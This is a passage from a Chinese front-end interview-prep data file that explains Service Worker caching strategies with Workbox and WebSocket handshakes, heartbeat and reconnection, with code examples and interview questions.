cache\n\n如果网络请求正常的话，先走网络请求，否则兜底走缓存\n\n![](https://static.ecool.fun//article/3178f27f-9549-40f4-a211-71eb205a5246.awebp)\n\n> 图片来源：[Strategies for service worker caching](https://developer.chrome.com/docs/workbox/caching-strategies-overview/#stale-while-revalidate \"https://developer.chrome.com/docs/workbox/caching-strategies-overview/#stale-while-revalidate\")\n\n这种策略是为了能够让用户在离线情况下也有一个好的体验，比如 Chrome 在断网情况下的小恐龙游戏\n\n![](https://static.ecool.fun//article/e4f9cbf5-c3d5-407d-9b22-0d327ef03cc2.awebp)\n\n## Stale-while-revalidate 异步缓存更新\n\n![](https://static.ecool.fun//article/9235fe3c-9564-420e-b5f9-30318d1d556a.awebp)\n\n> 图片来源：[Strategies for service worker caching](https://developer.chrome.com/docs/workbox/caching-strategies-overview/#stale-while-revalidate \"https://developer.chrome.com/docs/workbox/caching-strategies-overview/#stale-while-revalidate\")\n\n这一种比较常见，如果当前有命中缓存，那么先给客户端返回一个缓存的响应，同时再发送一个请求去服务端，更新最新结果到缓存中。\n\n这种策略一般常见于一些不经常变的数据，如用户信息数据、权限数据等，这种场景下如果数据变更之后，客户端还是读取旧的缓存不会引起致命的逻辑错误。\n\n# Workbox 介绍\n\n### Workbox 是什么\n\n上面介绍了这么多种常见缓存策略，如果都用原生的 ServiceWorker 来实现，那么将会非常繁琐，同时 ServiceWorker 上手门槛比较高\n\n而 google 开源的 Workbox 就是 ServiceWorker 的框架，主要目的是来简化 ServiceWorker 的使用，提供更加简单的方式来使用构建一个 ServiceWorker\n\nWorkBox 是一个完整的 ServiceWorker 解决方案，其涵盖了一系列工具，包括构建、运行时等，这里只单独介绍使用频率更高的一些策略及其插件内容\n\n### Workbox 的策略\n\n> [developer.chrome.com/docs/workbo…](https://developer.chrome.com/docs/workbox/modules/workbox-strategies/ \"https://developer.chrome.com/docs/workbox/modules/workbox-strategies/\")\n\n主要封装了上述介绍的一些策略，可以像下面一样简单地使用\n\n```javascript\nimport {registerRoute} from 'workbox-routing';\nimport {StaleWhileRevalidate} from 'workbox-strategies';\n\nregisterRoute(\n  // 标识命中怎么样的路由\n  ({url}) => url.pathname.startsWith('/images/avatars/'),\n  // 走 StaleWhileRevalidate 异步缓存策略\n  new StaleWhileRevalidate()\n);\n```\n\n使用一种缓存策略就是上面几行代码，没了，就这么简单\n\nWorkbox 的策略描述的是下面三者的关系：\n\n![](https://static.ecool.fun//article/e33946e6-00b2-4dcc-ad1f-0f8d7331dd23.awebp)\n\n> 图：策略描述的是 客户端、Network 和 Cache 三者的关系\n\n如果你需要这三者的关系跟上述的策略都不同，那么可以实现一个自定义的策略：\n\n```scala\nimport {Strategy} from 'workbox-strategies';\n\n// 自定义策略\nclass NewStrategy extends Strategy {\n  _handle(request, handler) {\n    // handler 有 Workbox 封装好的各种工具函数，比如添加缓存：handler.cachePut(xxx)\n    // 见：https://developer.chrome.com/docs/workbox/modules/workbox-strategies/#creating-a-new-strategy\n    // Define handling logic here\n  }\n}\n```\n\n实现自定义策略只需要把 `_handle` 函数定义好上面三者的关系即可，指的注意的是，由于策略可以使用各种插件，所以需要在适当的时机给插件触发下面定义好的[钩子](https://developer.chrome.com/docs/workbox/using-plugins/#methods-for-custom-plugins \"https://developer.chrome.com/docs/workbox/using-plugins/#methods-for-custom-plugins\")。\n\n> [developer.chrome.com/docs/workbo…](https://developer.chrome.com/docs/workbox/using-plugins/#methods-for-custom-plugins \"https://developer.chrome.com/docs/workbox/using-plugins/#methods-for-custom-plugins\")\n\n### Workbox 策略插件\n\n> [developer.chrome.com/docs/workbo…](https://developer.chrome.com/docs/workbox/using-plugins/ \"https://developer.chrome.com/docs/workbox/using-plugins/\")\n\n上面提到了策略是描述的是 客户端、Network 和 Cache 三者的关系，而当三者关系相同，但是一些细节不同的时候，我们可以考虑使用插件来丰富这些细节。\n\n比如我需要设置一下缓存的过期时间，那么我可以：\n\n```javascript\nimport {registerRoute} from 'workbox-routing';\nimport {CacheFirst} from 'workbox-strategies';\nimport {ExpirationPlugin} from 'workbox-expiration';\n\nregisterRoute(\n  ({request}) => request.destination === 'image',\n  new CacheFirst({ // 主要策略\n    cacheName: 'images',\n    plugins: [\n      new ExpirationPlugin({ // 策略插件\n        maxEntries: 60,\n        maxAgeSeconds: 30 * 24 * 60 * 60, // 设置一个 30 Days 的过期时间\n      }),\n    ],\n  })\n);\n```\n\n可以自定义自己的策略插件，如下：\n\n> 强烈推荐看这篇文档的视频介绍：[developer.chrome.com/docs/workbo…](https://developer.chrome.com/docs/workbox/using-plugins \"https://developer.chrome.com/docs/workbox/using-plugins\")\n\n```typescript\n// 这个插件即后面提到的 ServiceWorker 入口文件缓存方案部分实现细节\nclass StaleNotificationPlugin implements WorkboxPlugin {\n  // ...\n\n  fetchDidSucceed(params: FetchDidSucceedParam) {\n    // 在 Network 请求回来的时候，对比缓存版本和新回来的版本\n    // 检查版本差异\n    this.handleDiffVersion(params);\n\n    return Promise.resolve(params.response.clone());\n  }\n\n  async handlerDidError(params: HandlerDidErrorParam) {\n    // 当发生异常的时候，给客户端响应 network 请求\n    // 保证可用性\n    const { state, request, error } = params;\n    setTimeout(() => {\n      this.cleanUp(state);\n      this.onError(error);\n    });\n    // 直接走网络请求\n    return fetch(request);\n  }\n}\n\n// 使用的时候：\nregisterRoute(\n  ({ url }) => url.pathname.endsWith('/detail'),\n  new StaleWhileRevalidate({ // 策略\n    cacheName: 'xxx',\n    plugins: [\n      new StaleNotificationPlugin() // 自定义插件\n    ]\n  }),\n  'GET',\n);\n```\n\n### Workbok 的路由\n\n> [developer.chrome.com/docs/workbo…](https://developer.chrome.com/docs/workbox/modules/workbox-routing/ \"https://developer.chrome.com/docs/workbox/modules/workbox-routing/\")\n\nWorkbox 的路由在上面也有接触过，主要是匹配客户端发起的不同请求来走不同的处理逻辑\n\n```javascript\nimport {registerRoute} from 'workbox-routing';\n\nregisterRoute(matchCb, handlerCb);\n```\n\n# ServiceWorker 很危险\n\n-   Cache 可以缓存任何请求，比如 404、503 等状态的请求，如果没有加以控制便将其缓存，那么用户在 Cache First 等策略中将会一直请求到这种错误状态的请求，直到用户清除缓存\n-   在处理用户请求过程中，如果处理代码报错，那么可能会导致客户端一直接收不到请求，导致无限 loading，造成用户体验问题\n-   降级问题\n-   如果报错，可能会导致无限 pending，用户的请求将会一直挂着直到 timeout\n\n## 紧急移除 ServiceWorker\n\n如果不小心发布了一个含有严重错误逻辑的 ServiceWorker，可以发布下面代码的 ServiceWorker 来紧急移除\n\n> [developer.chrome.com/docs/workbo…](https://developer.chrome.com/docs/workbox/remove-buggy-service-workers/ \"https://developer.chrome.com/docs/workbox/remove-buggy-service-workers/\")\n\n```javascript\n// sw.js\n\nself.addEventListener('install', () => {\n  // Skip over the \"waiting\" lifecycle state, to ensure that our\n  // new service worker is activated immediately, even if there's\n  // another tab open controlled by our older service worker code.\n  // 不需要等待旧的 ServiceWorker\n  self.skipWaiting();\n});\n\nself.addEventListener('activate', () => {\n  // Optional: Get a list of all the current open windows/tabs under\n  // our service worker's control, and force them to reload.\n  // This can \"unbreak\" any open windows/tabs as soon as the new\n  // service worker activates, rather than users having to manually reload.\n  // 强制所有的客户端进行重定向\n  self.clients.matchAll({\n    type: 'window'\n  }).then(windowClients => {\n    windowClients.forEach((windowClient) => {\n      windowClient.navigate(windowClient.url);\n    });\n  });\n});\n```\n\n手动取消注册 ServiceWorker\n\n> [developer.mozilla.org/en-US/docs/…](https://developer.mozilla.org/en-US/docs/Web/API/ServiceWorkerRegistration/unregister \"https://developer.mozilla.org/en-US/docs/Web/API/ServiceWorkerRegistration/unregister\")\n\n# 应用：ServiceWorker 入口文件缓存方案\n\n通常我们的 SPA 的 HTML 入口文件是无缓存的，每一次都会到 CDN 请求最新的入口文件（即使是协商缓存，也至少需要经历一次请求服务器的链路）。在网络情况不佳时，会比较明显地影响页面加载速度，可以通过 ServiceWorker 来缓存入口文件。\n\n具体策略是：\n\n当用户访问入口文件的时候，首先返回本地的缓存，让浏览器开始解析，然后后台发起另一个请求去获取当前最新的入口文件。当新的入口文件返回来的时候，检测二者的版本是否一致（可以通过比较注入到入口文件的版本、文本全量对比等方式来判断）。\n\n如果判断二者版本一致，那么不做处理，这种情况相当于节省了一个网络链路；\n\n如果判断二者版本不一致，那么可以马上通知客户端（此处指的是当前浏览器 tab）进行 reload，而此时由于最新的文件已经拿到了，所以 reload 请求到的也是缓存，整体时间消耗约等于直接请求服务端获取最新入口文件的时间。\n\n通过上述这种策略，可以在大多数场景下减少入口文件请求的时间，达到优化的效果。\n\n![](https://static.ecool.fun//article/f8c0a46b-4f07-414d-9527-b365f69f1e5b.awebp)\n\n具体做法是在 Workbox 的异步缓存更新策略（stale while revalidate strategy）的基础上，增加一个 HTML 入口文件的 diff 过程，如果检查到 HTML 发生了改变，那么可以通过 `postMessage` 来通知客户端进行重载操作。\n\n> 如果 diff 发生错误便容易造成无限刷新，所以这种情况下可以再加上一个保险机制，在特定时间内不能够多次重载\n",
    "testPoint": "### 1. **Service Worker 的基本概念**\n   - 什么是 Service Worker？它的主要作用是什么？\n   - Service Worker 如何与主线程交互？它是如何增强 Web 应用的性能和用户体验的？\n\n### 2. **Service Worker 的工作原理**\n   - 请解释 Service Worker 的生命周期，包括 `install`、`activate` 和 `fetch` 阶段。\n   - 在 Service Worker 生命周期的各个阶段中，事件触发的顺序是什么？如何控制这些事件的流程？\n\n### 3. **Service Worker 的注册**\n   - 如何在项目中注册和安装一个 Service Worker？请提供一个简单的代码示例。\n   - 注册 Service Worker 时，作用域（scope）是如何定义的？如何通过 `scope` 控制 Service Worker 影响的路径？\n\n### 4. **缓存策略**\n   - Service Worker 中常见的缓存策略有哪些？请简要解释几种常见的缓存策略，比如 Cache First、Network First、Stale-While-Revalidate 等。\n   - 在项目中，如何根据不同的资源类型选择合适的缓存策略？举例说明静态资源、动态内容等的缓存策略。\n\n### 5. **离线缓存与 PWA**\n   - Service Worker 如何实现离线缓存？在没有网络的情况下，如何利用缓存提供内容？\n   - Service Worker 在 Progressive Web App (PWA) 中的角色是什么？如何通过 Service Worker 让 Web 应用支持离线功能？\n\n### 6. **缓存管理**\n   - 在 Service Worker 中，如何管理缓存的版本？请描述一种缓存更新和清理的机制，避免缓存污染。\n   - 如果缓存资源发生了更改，如何触发缓存更新？在什么情况下应当删除旧缓存？\n\n### 7. **消息传递与通信**\n   - Service Worker 和主线程之间如何进行通信？如何使用 `postMessage` 与主线程交互？\n   - 请举例说明如何通过 Service Worker 与页面通信，实现动态数据更新或实时通知。\n\n### 8. **推送通知（Push Notifications）**\n   - 如何通过 Service Worker 实现推送通知？推送通知的工作原理是什么？\n   - 在 Service Worker 中，如何确保推送通知的及时性和用户体验？有哪些常见的推送通知最佳实践？\n\n### 9. **同步（Background Sync）**\n   - 什么是后台同步（Background Sync）？它如何与 Service Worker 配合，确保数据在有网络连接时同步？\n   - 请举例说明后台同步的应用场景，比如在离线状态下保存用户数据并在网络恢复后同步到服务器。\n\n### 10. **Service Worker 的局限性**\n   - Service Worker 有哪些局限性？例如不能直接访问 DOM 等。\n   - 你认为在哪些场景下不适合使用 Service Worker？\n\n### 11. **Service Worker 的性能与安全性**\n   - Service Worker 的使用会影响页面性能吗？在使用中如何确保性能的最优化？\n   - Service Worker 对 Web 应用的安全性有哪些影响？如何防止 Service Worker 引入的安全隐患？\n\n### 12. **Service Worker 的实际应用**\n   - 在项目中，你如何使用 Service Worker 来优化用户体验？请举一个具体的例子，比如资源预加载或离线支持。\n   - 你在实际项目中是否遇到过 Service Worker 带来的 bug 或调试问题？如何解决的？\n\n### 13. **Service Worker 的调试和监控**\n   - 在开发和调试 Service Worker 时，使用哪些工具或方法来查看缓存、监控状态？\n   - 如何处理 Service Worker 注册和激活时的调试问题？遇到 Service Worker 不更新或未激活的情况应如何处理？\n\n### 14. **Service Worker 的兼容性与降级方案**\n   - Service Worker 在不同浏览器中的兼容性如何？如何确保应用在不支持 Service Worker 的浏览器上正常运行？\n   - 如果浏览器不支持 Service Worker，你会采用哪些降级方案来提供基本的离线体验？\n\n### 15. **Service Worker 与其他技术的结合**\n   - Service Worker 如何与 WebAssembly、IndexedDB 等技术结合使用，提升数据处理能力和缓存策略？\n   - 在实际项目中，Service Worker 是否可以和 Web Worker 或 Cache API 配合使用？它们之间有何区别和联系？\n\n### 16. **Service Worker 的高级应用**\n   - 除了离线缓存，Service Worker 还有哪些高级应用？如流式响应处理、图片懒加载等。\n   - 在大型 Web 应用中，如何规划多个 Service Worker 的协作？是否遇到过多 Service Worker 的管理问题？\n",
    "exerciseKeyList": "[\"f18218c8-4c74-4631-b66d-e7ac65929f35\",\"b84d40fe-e50a-48e1-b6bf-ddaf036b64fd\",\"f3a5d518-64e1-454a-80ec-5991c4cedeb0\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 26,
    "createAt": "2024-11-08T14:28:20.000Z",
    "updateAt": "2024-11-08T14:40:48.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "b84d40fe-e50a-48e1-b6bf-ddaf036b64fd",
        "title": "Service Worker 是如何缓存 http 请求资源的？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:36.000Z",
        "updateAt": "2024-08-15T09:39:41.000Z"
      },
      {
        "exerciseKey": "f18218c8-4c74-4631-b66d-e7ac65929f35",
        "title": "WebWorker、SharedWorker 和 ServiceWorker 有哪些区别？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:41.000Z",
        "updateAt": "2024-08-14T23:23:12.000Z"
      },
      {
        "exerciseKey": "f3a5d518-64e1-454a-80ec-5991c4cedeb0",
        "title": "Service worker是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-11T07:39:30.000Z",
        "updateAt": "2024-07-22T10:52:38.000Z"
      }
    ]
  },
  "157": {
    "id": 157,
    "tagId": 10,
    "title": "WebSocket",
    "explanation": "## 一、什么是WebSocket\n\nWebSocket 是一种在单个TCP连接上进行全双工通信的协议。WebSocket 使得客户端和服务器之间的数据交换变得更加简单，允许服务端主动向客户端推送数据。\n\n在 WebSocket API 中，浏览器和服务器只需要完成一次握手，两者之间就直接可以创建持久性的连接， 并进行双向数据传输。（维基百科）\n\nWebSocket本质上一种`计算机网络应用层的协议`，用来弥补http协议在持久通信能力上的不足。\n\nWebSocket 协议在2008年诞生，2011年成为国际标准。现在最新版本浏览器都已经支持了。\n\n它的最大特点就是，服务器可以主动向客户端推送信息，客户端也可以主动向服务器发送信息，是真正的双向平等对话，属于[服务器推送技术](https://en.wikipedia.org/wiki/Push_technology \"https://en.wikipedia.org/wiki/Push_technology\")的一种。\n\nWebSocket 的其他特点包括：\n\n（1）建立在 TCP 协议之上，服务器端的实现比较容易。\n\n（2）与 HTTP 协议有着良好的兼容性。默认端口也是80和443，并且握手阶段采用 HTTP 协议，因此握手时不容易屏蔽，能通过各种 HTTP 代理服务器。\n\n（3）数据格式比较轻量，性能开销小，通信高效。\n\n（4）可以发送文本，也可以发送二进制数据。\n\n（5）没有同源限制，客户端可以与任意服务器通信。\n\n（6）协议标识符是`ws`（如果加密，则为`wss`），服务器网址就是 URL。\n\n```js\nws://example.com:80/some/path\n```\n\n![](https://static.ecool.fun//article/a976149c-01f0-48dd-9b2b-fac95f7657ae.awebp)\n\n### 为什么需要 WebSocket？\n\n我们已经有了 HTTP 协议，为什么还需要另一个协议？它能带来什么好处？\n\n因为 HTTP 协议有一个缺陷：通信只能由客户端发起，不具备服务器推送能力。\n\n举例来说，我们想了解查询今天的实时数据，只能是客户端向服务器发出请求，服务器返回查询结果。HTTP 协议做不到服务器主动向客户端推送信息。\n\n![](https://static.ecool.fun//article/aeb165b1-9218-4df6-a399-3cc44bbe17d7.awebp)\n\n这种单向请求的特点，注定了如果服务器有连续的状态变化，客户端要获知就非常麻烦。我们只能使用[\"轮询\"](https://www.pubnub.com/blog/2014-12-01-http-long-polling/ \"https://www.pubnub.com/blog/2014-12-01-http-long-polling/\")：每隔一段时候，就发出一个询问，了解服务器有没有新的信息。最典型的场景就是聊天室。轮询的效率低，非常浪费资源（因为必须不停连接，或者 HTTP 连接始终打开）。\n\n在 WebSocket 协议出现以前，创建一个和服务端进双通道通信的 web 应用，需要依赖HTTP协议，进行不停的轮询，这会导致一些问题：\n\n-   服务端被迫维持来自每个客户端的大量不同的连接\n-   大量的轮询请求会造成高开销，比如会带上多余的header，造成了无用的数据传输。\n\nhttp协议本身是没有持久通信能力的，但是我们在实际的应用中，是很需要这种能力的，所以，为了解决这些问题，WebSocket协议由此而生，于2011年被IETF定为标准RFC6455，并被RFC7936所补充规范。\n\n并且在HTML5标准中增加了有关WebSocket协议的相关api，所以只要实现了HTML5标准的客户端，就可以与支持WebSocket协议的服务器进行全双工的持久通信了。\n\n### WebSocket 与 HTTP 的区别\n\nWebSocket 与 HTTP的关系图：\n\n![image.png](https://static.ecool.fun//article/e68cf819-83f8-4d15-b4cb-d8ac9f0e28ae.awebp)\n\n**相同点：** 都是一样基于TCP的，都是可靠性传输协议。都是应用层协议。\n\n**联系：** WebSocket在建立握手时，数据是通过HTTP传输的。但是建立之后，在真正传输时候是不需要HTTP协议的。\n\n下面一张图说明了 HTTP 与 WebSocket 的主要区别：\n\n![](https://static.ecool.fun//article/8a034317-52d0-4b0b-ae12-7fc8eeed130c.awebp)\n\n1、WebSocket是双向通信协议，模拟Socket协议，可以双向发送或接受信息，而HTTP是单向的； 2、WebSocket是需要浏览器和服务器握手进行建立连接的，而http是浏览器发起向服务器的连接。\n\n注意：虽然HTTP/2也具备服务器推送功能，但HTTP/2 只能推送静态资源，无法推送指定的信息。\n\n## 二、WebSocket协议的原理\n\n与http协议一样，WebSocket协议也需要通过已建立的TCP连接来传输数据。具体实现上是通过http协议建立通道，然后在此基础上用真正的WebSocket协议进行通信，所以WebSocket协议和http协议是有一定的交叉关系的。\n\n首先，WebSocket 是一个持久化的协议，相对于 HTTP 这种非持久的协议来说。简单的举个例子吧，用目前应用比较广泛的 PHP 生命周期来解释。\n\nHTTP 的生命周期通过 Request 来界定，也就是一个 Request 一个 Response ，那么在 HTTP1.0 中，这次 HTTP 请求就结束了。\n\n在 HTTP1.1 中进行了改进，使得有一个 keep-alive，也就是说，在一个 HTTP 连接中，可以发送多个 Request，接收多个 Response。但是请记住 Request = Response， 在 HTTP 中永远是这样，也就是说一个 Request 只能有一个 Response。而且这个 Response 也是被动的，不能主动发起。\n\n首先 WebSocket 是基于 HTTP 协议的，或者说借用了 HTTP 协议来完成一部分握手。\n\n首先我们来看个典型的 WebSocket 握手\n\n```js\nGET /chat HTTP/1.1\nHost: server.example.com\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==\nSec-WebSocket-Protocol: chat, superchat\nSec-WebSocket-Version: 13\nOrigin: http://example.com\n```\n\n熟悉 HTTP 的童鞋可能发现了，这段类似 HTTP 协议的握手请求中，多了这么几个东西。\n\n```js\nUpgrade: websocket\nConnection: Upgrade\n```\n\n这个就是 WebSocket 的核心了，告诉 Apache 、 Nginx 等服务器：注意啦，我发起的请求要用 WebSocket 协议，快点帮我找到对应的助理处理~而不是那个老土的 HTTP。\n\n```js\nSec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==\nSec-WebSocket-Protocol: chat, superchat\nSec-WebSocket-Version: 13\n```\n\n首先， Sec-WebSocket-Key 是一个 Base64 encode 的值，这个是浏览器随机生成的，告诉服务器：泥煤，不要忽悠我，我要验证你是不是真的是 WebSocket 助理。\n\n然后， Sec\\_WebSocket-Protocol 是一个用户定义的字符串，用来区分同 URL 下，不同的服务所需要的协议。简单理解：今晚我要服务A，别搞错啦~\n\n最后， Sec-WebSocket-Version 是告诉服务器所使用的 WebSocket Draft （协议版本），在最初的时候，WebSocket 协议还在 Draft 阶段，各种奇奇怪怪的协议都有，而且还有很多期奇奇怪怪不同的东西，什么 Firefox 和 Chrome 用的不是一个版本之类的，当初 WebSocket 协议太多可是一个大难题。。不过现在还好，已经定下来啦~大家都使用同一个版本： 服务员，我要的是13岁的噢→\\_→\n\n然后服务器会返回下列东西，表示已经接受到请求， 成功建立 WebSocket 啦！\n\n```js\nHTTP/1.1 101 Switching Protocols\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=\nSec-WebSocket-Protocol: chat\n```\n\n这里开始就是 HTTP 最后负责的区域了，告诉客户，我已经成功切换协议啦~\n\n```js\nUpgrade: websocket\nConnection: Upgrade\n```\n\n依然是固定的，告诉客户端即将升级的是 WebSocket 协议，而不是 mozillasocket，lurnarsocket 或者 shitsocket。\n\n然后， Sec-WebSocket-Accept 这个则是经过服务器确认，并且加密过后的 Sec-WebSocket-Key 。 服务器：好啦好啦，知道啦，给你看我的 ID CARD 来证明行了吧。\n\n后面的， Sec-WebSocket-Protocol 则是表示最终使用的协议。\n\n至此，HTTP 已经完成它所有工作了，接下来就是完全按照 WebSocket 协议进行了。\n\n总结，**WebSocket连接的过程是：**\n\n首先，客户端发起http请求，经过3次握手后，建立起TCP连接；http请求里存放WebSocket支持的版本号等信息，如：Upgrade、Connection、WebSocket-Version等；\n\n然后，服务器收到客户端的握手请求后，同样采用HTTP协议回馈数据；\n\n最后，客户端收到连接成功的消息后，开始借助于TCP传输信道进行全双工通信。\n\n## 三、Websocket的优缺点\n\n**优点：**\n\n-   WebSocket协议一旦建议后，互相沟通所消耗的请求头是很小的\n-   服务器可以向客户端推送消息了\n\n**缺点：**\n\n-   少部分浏览器不支持，浏览器支持的程度与方式有区别（IE10）\n\n## 四、[WebSocket应用场景](https://link.zhihu.com/?target=https%3A//www.qcloud.com/community/article/164816001481011826%3FfromSource%3Dgwzcw.93406.93406.93406 \"https://link.zhihu.com/?target=https%3A//www.qcloud.com/community/article/164816001481011826%3FfromSource%3Dgwzcw.93406.93406.93406\")\n\n-   即时聊天通信\n-   多玩家游戏\n-   在线协同编辑/编辑\n-   实时数据流的拉取与推送\n-   体育/游戏实况\n-   实时地图位置\n-   即时`Web`应用程序：即时`Web`应用程序使用一个`Web`套接字在客户端显示数据，这些数据由后端服务器连续发送。在`WebSocke`t中，数据被连续推送/传输到已经打开的同一连接中，这就是为什么`WebSocket`更快并提高了应用程序性能的原因。 例如在交易网站或比特币交易中，这是最不稳定的事情，它用于显示价格波动，数据被后端服务器使用Web套接字通道连续推送到客户端。\n-   游戏应用程序：在游戏应用程序中，你可能会注意到，服务器会持续接收数据，而不会刷新用户界面。屏幕上的用户界面会自动刷新，而且不需要建立新的连接，因此在`WebSocket`游戏应用程序中非常有帮助。\n-   聊天应用程序：聊天应用程序仅使用`WebSocket`建立一次连接，便能在订阅户之间交换，发布和广播消息。它重复使用相同的`WebSocket`连接，用于发送和接收消息以及一对一的消息传输。\n\n### 不能使用WebSocket的场景\n\n如果我们需要通过网络传输的任何实时更新或连续数据流，则可以使用`WebSocket`。如果我们要获取旧数据，或者只想获取一次数据供应用程序使用，则应该使用`HTTP`协议，不需要很频繁或仅获取一次的数据可以通过简单的`HTTP`请求查询，因此在这种情况下最好不要使用`WebSocket`。\n\n注意：如果仅加载一次数据，则`RESTful` `Web`服务足以从服务器获取数据。\n\n## 五、websocket 断线重连\n\n心跳就是客户端定时的给服务端发送消息，证明客户端是在线的， 如果超过一定的时间没有发送则就是离线了。\n\n### 如何判断在线离线？\n\n当客户端第一次发送请求至服务端时会携带唯一标识、以及时间戳，服务端到db或者缓存去查询改请求的唯一标识，如果不存在就存入db或者缓存中，\n\n第二次客户端定时再次发送请求依旧携带唯一标识、以及时间戳，服务端到db或者缓存去查询改请求的唯一标识，如果存在就把上次的时间戳拿取出来，使用当前时间戳减去上次的时间，\n\n得出的毫秒秒数判断是否大于指定的时间，若小于的话就是在线，否则就是离线；\n\n### 如何解决断线问题\n\n通过查阅资料了解到 nginx 代理的 websocket 转发，无消息连接会出现超时断开问题。网上资料提到解决方案两种，一种是修改nginx配置信息，第二种是websocket发送心跳包。\n\n下面就来总结一下本次项目实践中解决的websocket的断线 和 重连 这两个问题的解决方案。\n\n主动触发包括主动断开连接，客户端主动发送消息给后端\n\n1.  主动断开连接\n\n```js\nws.close();\n```\n\n主动断开连接，根据需要使用，基本很少用到。\n\n2.  主动发送消息\n\n```js\nws.send(\"hello world\");\n```\n\n针对websocket断线我们来分析一下，\n\n-   断线的可能原因1：websocket超时没有消息自动断开连接，应对措施：\n    \n    这时候我们就需要知道服务端设置的超时时长是多少，在小于超时时间内发送心跳包，有2中方案:一种是客户端主动发送上行心跳包，另一种方案是服务端主动发送下行心跳包。\n    \n    下面主要讲一下客户端也就是前端如何实现心跳包：\n    \n    首先了解一下心跳包机制\n    \n    跳包之所以叫心跳包是因为：它像心跳一样每隔固定时间发一次，以此来告诉服务器，这个客户端还活着。事实上这是为了保持长连接，至于这个包的内容，是没有什么特别规定的，不过一般都是很小的包，或者只包含包头的一个空包。\n    \n    在TCP的机制里面，本身是存在有心跳包的机制的，也就是TCP的选项：SO\\_KEEPALIVE。系统默认是设置的2小时的心跳频率。但是它检查不到机器断电、网线拔出、防火墙这些断线。而且逻辑层处理断线可能也不是那么好处理。一般，如果只是用于保活还是可以的。\n    \n    心跳包一般来说都是在逻辑层发送空的echo包来实现的。`下一个定时器，在一定时间间隔下发送一个空包给客户端，然后客户端反馈一个同样的空包回来，服务器如果在一定时间内收不到客户端发送过来的反馈包，那就只有认定说掉线了。`\n    \n    在长连接下，有可能很长一段时间都没有数据往来。理论上说，这个连接是一直保持连接的，但是实际情况中，如果中间节点出现什么故障是难以知道的。更要命的是，有的节点(防火墙)会自动把一定时间之内没有数据交互的连接给断掉。在这个时候，就需要我们的心跳包了，用于维持长连接，保活。\n    \n    心跳检测步骤：\n    \n    1.  客户端每隔一个时间间隔发生一个探测包给服务器\n    2.  客户端发包时启动一个超时定时器\n    3.  服务器端接收到检测包，应该回应一个包\n    4.  如果客户机收到服务器的应答包，则说明服务器正常，删除超时定时器\n    5.  如果客户端的超时定时器超时，依然没有收到应答包，则说明服务器挂了\n    \n    ```js\n    // 前端解决方案：心跳检测\n    var heartCheck = {\n        timeout: 30000, //30秒发一次心跳\n        timeoutObj: null,\n        serverTimeoutObj: null,\n        reset: function(){\n            clearTimeout(this.timeoutObj);\n            clearTimeout(this.serverTimeoutObj);\n            return this;\n        },\n        start: function(){\n            var self = this;\n            this.timeoutObj = setTimeout(function(){\n                //这里发送一个心跳，后端收到后，返回一个心跳消息，\n                //onmessage拿到返回的心跳就说明连接正常\n                ws.send(\"ping\");\n                console.log(\"ping!\")\n    \n                self.serverTimeoutObj = setTimeout(function(){//如果超过一定时间还没重置，说明后端主动断开了\n                    ws.close(); //如果onclose会执行reconnect，我们执行ws.close()就行了.如果直接执行reconnect 会触发onclose导致重连两次\n                }, self.timeout);\n            }, this.timeout);\n        }\n    }\n    ```\n    \n-   断线的可能原因2：websocket异常包括服务端出现中断，交互切屏等等客户端异常中断等等\n    \n    当若服务端宕机了，客户端怎么做、服务端再次上线时怎么做？\n    \n    客户端则需要断开连接，通过onclose 关闭连接，服务端再次上线时则需要清除之间存的数据，若不清除 则会造成只要请求到服务端的都会被视为离线。\n    \n    针对这种异常的中断解决方案就是处理重连，下面我们给出的重连方案是使用js库处理：引入reconnecting-websocket.min.js，ws建立链接方法使用js库api方法：\n    \n    ```js\n    var ws = new ReconnectingWebSocket(url);\n    // 断线重连：\n    reconnectSocket(){\n        if ('ws' in window) {\n            ws = new ReconnectingWebSocket(url);\n        } else if ('MozWebSocket' in window) {\n           ws = new MozWebSocket(url);\n        } else {\n          ws = new SockJS(url);\n        }\n    }\n    ```\n    \n    断网监测支持使用js库：offline.min.js\n    \n    ```js\n    onLineCheck(){\n        Offline.check();\n        console.log(Offline.state,'---Offline.state');\n        console.log(this.socketStatus,'---this.socketStatus');\n    \n        if(!this.socketStatus){\n            console.log('网络连接已断开！');\n            if(Offline.state === 'up' && websocket.reconnectAttempts > websocket.maxReconnectInterval){\n                window.location.reload();\n            }\n            reconnectSocket();\n        }else{\n            console.log('网络连接成功！');\n            websocket.send(\"heartBeat\");\n        }\n    }\n    \n    // 使用：在websocket断开链接时调用网络中断监测\n    websocket.onclose => () {\n        onLineCheck();\n    };\n    ```\n    \n    以上方案，只是抛砖引玉，如果大家有更好的解决方案欢迎评论区分享交流。\n    \n\n## 六、总结\n\n-   WebSocket 是为了在 web 应用上进行双通道通信而产生的协议，相比于轮询HTTP请求的方式，WebSocket 有节省服务器资源，效率高等优点。\n-   WebSocket 中的掩码是为了防止早期版本中存在中间缓存污染攻击等问题而设置的，客户端向服务端发送数据需要掩码，服务端向客户端发送数据不需要掩码。\n-   WebSocket 中 Sec-WebSocket-Key 的生成算法是拼接服务端和客户端生成的字符串，进行SHA1哈希算法，再用base64编码。\n-   WebSocket 协议握手是依靠 HTTP 协议的，依靠于 HTTP 响应101进行协议升级转换。\n",
